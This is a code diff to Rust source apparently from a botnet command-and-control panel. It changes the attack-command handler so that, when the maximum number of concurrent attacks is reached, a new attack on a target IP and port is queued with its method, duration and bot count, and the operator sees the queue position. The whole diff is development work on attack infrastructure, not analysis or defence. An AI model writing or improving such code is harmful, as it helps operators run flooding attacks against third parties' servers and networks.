@@ -1,5 +1,4 @@
 use std::sync::Arc;
-use tokio::io::AsyncWriteExt;
 use crate::modules::client_manager::Client;
 use crate::modules::state::AppState;
 use crate::modules::error::{Result, AuditLog, log_audit_event};
@@ -121,7 +120,30 @@ pub async fn handle_attack_command(client: &Arc<Client>, state: &Arc<AppState>, 
                 bot_count, attack_id, display_target, port, method_str, duration).as_bytes()).await?;
         }
         Err(e) => {
-            client.write(format!("\x1b[38;5;196m[X] Failed to start attack: {}\n\r", e).as_bytes()).await?;
+            // Check if error is due to capacity and try to queue
+            if e.contains("Maximum concurrent attacks reached") {
+                match state.attack_manager.queue_attack(
+                    method_str.clone(),
+                    ip,
+                    port,
+                    duration,
+                    client.user.username.clone(),
+                    bot_count
+                ).await {
+                    Ok(pos) => {
+                        client.write(format!("\x1b[38;5;226m[!] Max attacks reached. Added to queue (Position: {})\n\r", pos).as_bytes()).await?;
+                        
+                        let audit_event = AuditLog::new(client.user.username.clone(), "QUEUE_ATTACK".to_string(), "SUCCESS".to_string())
+                            .with_target(format!("{}:{} (Method: {}, Duration: {}s)", display_target, port, method_str, duration));
+                        let _ = log_audit_event(audit_event, &state.audit_file).await;
+                    }
+                    Err(queue_err) => {
+                        client.write(format!("\x1b[38;5;196m[X] Failed to start or queue attack: {}\n\r", queue_err).as_bytes()).await?;
+                    }
+                }
+            } else {
+                client.write(format!("\x1b[38;5;196m[X] Failed to start attack: {}\n\r", e).as_bytes()).await?;
+            }
         }
     }
 
